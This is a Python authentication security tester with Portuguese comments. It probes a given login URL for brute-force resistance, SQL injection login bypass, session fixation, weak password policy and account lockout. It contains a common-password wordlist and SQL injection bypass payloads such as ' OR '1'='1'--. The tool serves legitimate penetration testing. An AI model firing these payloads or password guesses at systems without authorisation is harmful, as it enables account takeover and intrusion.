#!/usr/bin/env python3
"""
Authentication Security Tests
Suite de testes de segurança de autenticação.
"""

import time
import argparse
import hashlib
from typing import List, Dict, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

import requests
from rich.console import Console
from rich.table import Table
from rich.progress import Progress

console = Console()

# Senhas comuns para teste de força bruta
COMMON_PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "iloveyou", "master", "sunshine", "ashley",
    "bailey", "shadow", "123123", "654321", "superman",
    "admin", "admin123", "root", "toor", "pass", "test",
]

# Payloads de bypass
BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "admin'--",
    "admin'#",
    "' OR 1=1--",
    ") OR ('1'='1",
    "' OR ''='",
]


@dataclass
class AuthTestResult:
    """Resultado de teste de autenticação."""
    test_name: str
    status: str  # passed, failed, warning
    details: str
    severity: str = "info"


class AuthTester:
    """Testador de segurança de autenticação."""
    
    def __init__(self, login_url: str, username_field: str = "username",
                 password_field: str = "password"):
        self.login_url = login_url
        self.username_field = username_field
        self.password_field = password_field
        self.session = requests.Session()
        self.results: List[AuthTestResult] = []
    
    def test_brute_force(self, username: str, wordlist: List[str] = None) -> AuthTestResult:
        """Testa resistência a força bruta."""
        console.print("[cyan]🔐 Testando resistência a força bruta...[/cyan]")
        
        passwords = wordlist or COMMON_PASSWORDS
        attempts = 0
        blocked = False
        
        for password in passwords[:20]:  # Limitar para evitar bloqueio
            data = {
                self.username_field: username,
                self.password_field: password
            }
            
            try:
                response = self.session.post(self.login_url, data=data, allow_redirects=False)
                attempts += 1
                
                # Verificar se foi bloqueado
                if response.status_code == 429 or "blocked" in response.text.lower():
                    blocked = True
                    break
                    
            except Exception as e:
                pass
        
        if blocked:
            return AuthTestResult(
                test_name="Brute Force Protection",
                status="passed",
                details=f"Bloqueado após {attempts} tentativas",
                severity="info"
            )
        else:
            return AuthTestResult(
                test_name="Brute Force Protection",
                status="failed",
                details=f"Permitiu {attempts} tentativas sem bloqueio",
                severity="high"
            )
    
    def test_sql_bypass(self, username: str = "admin") -> AuthTestResult:
        """Testa bypass de autenticação via SQL Injection."""
        console.print("[cyan]🔐 Testando bypass SQL Injection...[/cyan]")
        
        for payload in BYPASS_PAYLOADS:
            data = {
                self.username_field: payload,
                self.password_field: "anything"
            }
            
            try:
                response = self.session.post(self.login_url, data=data, allow_redirects=False)
                
                # Verificar se houve login bem-sucedido
                if response.status_code in [301, 302] or "dashboard" in response.text.lower():
                    return AuthTestResult(
                        test_name="SQL Injection Bypass",
                        status="failed",
                        details=f"Bypass possível com: {payload}",
                        severity="critical"
                    )
            except:
                pass
        
        return AuthTestResult(
            test_name="SQL Injection Bypass",
            status="passed",
            details="Nenhum bypass encontrado",
            severity="info"
        )
    
    def test_session_fixation(self) -> AuthTestResult:
        """Testa vulnerabilidade de Session Fixation."""
        console.print("[cyan]🔐 Testando Session Fixation...[/cyan]")
        
        # Obter session antes do login
        self.session.get(self.login_url)
        session_before = self.session.cookies.get("session") or self.session.cookies.get("PHPSESSID")
        
        # Simular login (mesmo que falhe)
        data = {
            self.username_field: "testuser",
            self.password_field: "testpass"
        }
        self.session.post(self.login_url, data=data)
        
        # Verificar se session mudou
        session_after = self.session.cookies.get("session") or self.session.cookies.get("PHPSESSID")
        
        if session_before and session_after and session_before == session_after:
            return AuthTestResult(
                test_name="Session Fixation",
                status="warning",
                details="Session ID não regenerado após login",
                severity="medium"
            )
        
        return AuthTestResult(
            test_name="Session Fixation",
            status="passed",
            details="Session ID regenerado corretamente",
            severity="info"
        )
    
    def test_password_policy(self) -> AuthTestResult:
        """Testa política de senhas."""
        console.print("[cyan]🔐 Testando política de senhas...[/cyan]")
        
        weak_passwords = ["a", "123", "pass", "password"]
        accepted_weak = []
        
        for weak in weak_passwords:
            data = {
                self.username_field: "newuser@test.com",
                self.password_field: weak,
                "confirm_password": weak
            }
            
            # Tentar registrar com senha fraca
            try:
                response = self.session.post(
                    self.login_url.replace("login", "register"),
                    data=data
                )
                
                if "weak" not in response.text.lower() and "strong" not in response.text.lower():
                    accepted_weak.append(weak)
            except:
                pass
        
        if accepted_weak:
            return AuthTestResult(
                test_name="Password Policy",
                status="warning",
                details=f"Senhas fracas aceitas: {accepted_weak}",
                severity="medium"
            )
        
        return AuthTestResult(
            test_name="Password Policy",
            status="passed",
            details="Política de senhas parece adequada",
            severity="info"
        )
    
    def test_account_lockout(self, username: str, attempts: int = 10) -> AuthTestResult:
        """Testa bloqueio de conta."""
        console.print("[cyan]🔐 Testando bloqueio de conta...[/cyan]")
        
        for i in range(attempts):
            data = {
                self.username_field: username,
                self.password_field: f"wrongpass{i}"
            }
            
            response = self.session.post(self.login_url, data=data)
            
            if "locked" in response.text.lower() or "blocked" in response.text.lower():
                return AuthTestResult(
                    test_name="Account Lockout",
                    status="passed",
                    details=f"Conta bloqueada após {i+1} tentativas",
                    severity="info"
                )
        
        return AuthTestResult(
            test_name="Account Lockout",
            status="warning",
            details=f"Conta não bloqueada após {attempts} tentativas",
            severity="medium"
        )
    
    def run_all_tests(self, username: str = "admin") -> List[AuthTestResult]:
        """Executa todos os testes."""
        console.print("\n[bold cyan]🛡️ Iniciando testes de autenticação...[/bold cyan]\n")
        
        self.results.append(self.test_sql_bypass(username))
        self.results.append(self.test_session_fixation())
        self.results.append(self.test_password_policy())
        self.results.append(self.test_brute_force(username))
        self.results.append(self.test_account_lockout(username))
        
        return self.results
    
    def print_results(self):
        """Imprime resultados dos testes."""
        table = Table(title="\n📊 Resultados dos Testes de Autenticação")
        table.add_column("Teste", style="cyan")
        table.add_column("Status")
        table.add_column("Severidade")
        table.add_column("Detalhes")
        
        status_styles = {
            "passed": "green",
            "failed": "red",
            "warning": "yellow"
        }
        
        severity_styles = {
            "critical": "red bold",
            "high": "red",
            "medium": "yellow",
            "low": "cyan",
            "info": "white"
        }
        
        for result in self.results:
            status_style = status_styles.get(result.status, "white")
            severity_style = severity_styles.get(result.severity, "white")
            
            status_icon = "✅" if result.status == "passed" else "❌" if result.status == "failed" else "⚠️"
            
            table.add_row(
                result.test_name,
                f"[{status_style}]{status_icon} {result.status}[/{status_style}]",
                f"[{severity_style}]{result.severity}[/{severity_style}]",
                result.details
            )
        
        console.print(table)
        
        # Resumo
        passed = len([r for r in self.results if r.status == "passed"])
        failed = len([r for r in self.results if r.status == "failed"])
        warnings = len([r for r in self.results if r.status == "warning"])
        
        console.print(f"\n✅ Passed: {passed} | ❌ Failed: {failed} | ⚠️ Warnings: {warnings}")


def main():
    parser = argparse.ArgumentParser(description="Authentication Security Tests")
    parser.add_argument("--url", "-u", required=True, help="Login URL")
    parser.add_argument("--username", default="admin", help="Username para testes")
    parser.add_argument("--username-field", default="username")
    parser.add_argument("--password-field", default="password")
    
    args = parser.parse_args()
    
    tester = AuthTester(
        login_url=args.url,
        username_field=args.username_field,
        password_field=args.password_field
    )
    
    tester.run_all_tests(args.username)
    tester.print_results()
    
    # Exit code
    failed = len([r for r in tester.results if r.status == "failed"])
    exit(1 if failed > 0 else 0)


if __name__ == "__main__":
    main()
